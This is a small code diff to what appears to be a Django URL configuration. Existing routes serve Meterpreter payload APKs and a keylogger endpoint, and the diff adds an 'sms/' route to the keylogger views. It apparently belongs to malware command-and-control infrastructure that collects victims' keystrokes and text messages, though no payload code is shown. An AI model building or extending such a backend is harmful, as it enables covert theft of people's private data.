@@ -8,4 +8,5 @@ urlpatterns = [
     path("list/", testViews.ReleaseView.as_view()),
     path("get_apk_file/<str:apk_name>/", meterpreter_payload_views.get_apk_file),
     path("key/", keylogger_views.key),
+    path("sms/", keylogger_views.sms),
 ]
